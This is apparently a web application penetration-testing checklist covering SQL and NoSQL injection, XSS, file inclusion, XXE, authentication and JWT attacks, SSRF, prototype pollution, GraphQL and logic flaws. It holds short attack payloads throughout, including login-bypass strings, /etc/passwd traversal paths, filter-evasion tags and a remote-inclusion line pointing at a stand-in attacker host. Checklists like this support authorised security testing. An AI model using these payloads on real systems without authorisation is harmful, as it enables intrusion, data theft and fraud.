## Fuzzing

- Fuzz all endpoints (API, directories, internal addresses, file extensions…)
    - If an API is like `/api/v1/my-profile` , don’t forget to also fuzz `/api/FUZZ/my-profile`
- robots.txt
- Also look for .php, .html, .txt,…
- Check for WAF `wafw00f <URL>` .
- Overexposure from endpoints (returning too much data).
## SQLi

- Test `‘` and `“` and nothing.
- Test with `ORDER BY 1-20 -- -` to figure out the number of returned columns
- Test with `UNION SELECT null, null, ...`
- Test with `UNION SELECT 1,2,3, ...`
- Test previous 3 and without URL encoding ( `+` and `%20` are NOT the same)
- Test with SQLMap.    
- Test for login bypass with `' and 1=1-- -`
- Test for blind SQLi.
- Test for second-order SQLi.
- Test for NoSQLi
    - Different operators: `$eq, $ne, $gt, $gte, $lt, $lte`
    - Test for login bypass: `{"username": "anyname", "password": {"$ne": ""}}`
    - Test for id bypass: `http://localhost/v1/api?id[$ne]=null`

## XSS
- Is your input reflected in the response?
- Can we use events (onload, onerror)?
- Is your input stored and later rendered?
- Fuzz for tags and attributes that are allowed.
- Is there a `href`attribute that can be misused? (`javascript:alert()` )
- Do you see `document.script`inside the codebase?
- Do you see `script`tags in the response?
- Can you inject a `<base href>` tag to change how relative URLs resolve?
- Can you make the payload bigger by adding 10.000 characters? (WAF evasion)
- Can you add special characters and see if they’re filtered? (`”’testing§&%*;#{}`)
- If filtered, does `<scrscriptipt>prompt()</scriscriptpt>` work?

## File Inclusion
- Make sure Burp Suite has turned of the filter for CSS and images.
- Test for LFI
    - Can you access local files (../../../etc/passwd).
    - Test with obfuscation (….//….//….//etc/passwd).
    - Test for null byte injection (../../../etc/passwd%00).
    - Test for protocol wrappers (php://, data://).
- Test for RFI
    - Can you include remote files (http://hacker.com/malicious.php)
    - Test with obfuscation (hthttptp://hacker.com/malicious.php)
- Can you achieve RCE?
    - Going to a php file you uploaded?
- Is a part of the path ‘obligated’? (e.g. `var/www/html/../../../etc/passwd` )

## XXE
- Identify endpoints that can process XML.
- Identify endpoints that accept SVG or DOCX.
- Trying XInclude attack.
- If XXE is possible, check for opportunities to perform SSRF.

## Attacking authentication
- Can we enumerate usernames
    - Difference in response time with a user we know exists and one we know does not exist.
        - `select * from users where username = 'idpnt' union select 1 as id, 'alice' as username, '123' as password`
    - Difference in response time with large passwords on login
    - Slight differences in response length
    - Use an full exact fail message as a reverse search
    - Registering a username that we know exists
- Check password reset
- Check keep logged in functionality
- Test for brute force protection
    - Can we spoof headers (X-Real-IP, X-Forwarded-For, X-Originating-IP, Client-IP, True-Client-IP)
- Check for MFA
    - Check if token can be brute forced
    - Try SQLi on MFA token
    - Can you force the endpoint you want to reach by skipping some steps. (e.g go to (user-dashboard after logging in but before entering a MFA)
    - Check if the MFA works on different users.
- Default credentials
- Check tokens
    - Sequencer for predictability
    - Signature on JWT

        - Is it possible to send an unsigned token?
            
        - Signature “none” attack.
            
        - Is it possible to crack the signature with hashcat or jwt_tool?
            
        
    

## Command injection

- Test for simple injections with ;, &&, || and |.
    
- Test for blind injection. Use ping or curl.
    
- Test with a list of potentially dangerous functions/methods (like exec(), system(), passthru() in PHP, or exec, eval in Node.js).
    

## SSTI

- Is a input reflected on the response?
    
- If the payload is not working on the frontend, make sure to check also the response in Burp.
    

## CSRF

- Does every form has a CSRF token?
    
- Test with a random token
    
- Can we use GET instead of POST (can our payload be in the URI instead of the body)?
    

## SSRF

- Identify all points where the application makes a server-side HTTP request (body, headers, parameters).
    
- Does the application accept IP addresses or localhost as hostname?
    
- Map out internal endpoints (fuzzing).
    
- Alternative IP notation (e.g. 127.0.0.1 in hex is 0x7f.0x0.0x0.0x1).
    

## Insecure File Upload

- Are there file type restrictions?
    
- Test for bypassing file extension filters (.phtml, php5)
    
- Upload a file with double extension (.jpg.php)
    
- Test for malicious content inside a file (XXE inside a XML upload).
    
- Are the uploaded files accessible trough an URL?
    
- Can others access the uploaded files?
    

## Broken Access Control

- Check for ID’s inside requests.
    
- Forceful browsing (go straight to /admin)
    
- Can we perform actions on pages we were not supposed to reach? (/admin is protected, but /admin-roles is not)
    
- Check if you can use functionality that’s not inside your authorization?
    
    - Change a GET request to a PUT and try changing it values that it returns. (eg, use a PUT on a GET userStat and change the stats of a different user)
        
    - Can you change the ID on a DELETE endpoint so you end up deleting a post you’re not supposed to?
        
    
- Decode tokens and see if you can change them.
    

## JWT

- Can you use the request without the token?
- Can you use a unsigned token?
- Can you change the payload (different user)?
- Is signature ‘none’ attack possible?
- Can you crack the token itself (hashcat or jwt_tool)?
- Can you use header injection?
- Analyse JWT with jwt_tool.
- Can you use a JWT of a low level user to perform high level actions.
## Token
- Is the token Base64?
- Can Sequencer do an analysis (don’t forget to enable base64-decode before analyzing if applicable)
- Can you forge a token on basis of Sequencer results?
    

## Websockets

- Check in response for `upgrade: Websocket`
- WebSocket Hijacking
    - Handshake relies on cookies.
    - No CSRF token.
    - Same site cookie is ‘None’.

## Mass assignment
- Check for leaky endpoints.
- Check JWT (eg `“role”:”admin”`).
- Code review (spread operators).

## Open Redirect
- check frontend code for redirects (on click —> location.href).
- check URL for a redirect.

## Race conditions
- Is there a multi-step process (so you can hammer step 2)?
- Check if a duplicate action is allowed (apply, redeem, confirm,…)
- Are there coupon, voucher, gift-card redeem endpoints?
- Is there a reset email functionality?

## API
- Can you use other HTTP methods?
- Fuzz the APIs (eg if there is `api/v1/checkout` check if there is `api/v2/checkout`, but don’t forget to check all the different parameters).

## Prototype Pollution
- Can you change the objects’ parameter with `{"__proto__":{"isAdmin":true}}`
- Can you change the URL parameter with `?__proto__[isAdmin]=true`
    - If successful, create a payload and URL encode it.
    
- Consult DOM Invader.
- Use Burp extension for server-side pollution
- Consider filters. `__pro__proto__to__` might work.
- Look for `eval()` ,`document.createElement()` , `innerHTML`, `Object.assign()`
- Look for URL parameters in the code.

## GraphQL
- Fuzz the application to find extra endpoints, query or mutation fields.
    - Use the endpoints list.
    - Write down all mutation/queries and ask ChatGPT to make a list with potential hidden names.
- Is Introspection possible?
    - Put the introspection into https://apis.guru/graphql-voyager/.
- Information Disclosure
    - Can we query extra fields?
    - Use field suggestion to discover more fields.
    - Use field stuffing to discover more fields.
- Batch attack possible?
- Injection attacks, CSRF, IDOR, BAC, and other web attacks?
## WAF
- Can you add a bunch of data before the payload?
- Can you encode the payload?
- Can you obfuscate the payload?
## Logic flaws

- Can you adjust things like a price/refund amount/points inside the post request?
- Can you add multiple discount code's?

    - ```
        // Adding extra lines
        "delivery_address":"test",
        "phone":"123",
        "payment_method":"card",
        "notes":"",
        "discount":"PIZZA-10",
        "discount":"PIZZA-10",
        "discount":"PIZZA-10"
        ```
        
        ```
        // Adding inside a array
        "delivery_address":"test",
        "phone":"123",
        "payment_method":"card",
        "notes":"",
        "discount":["PIZZA-10",
        "PIZZA-10",
        "PIZZA-10",
        "PIZZA-10",
        "PIZZA-10"
        ]}
        ```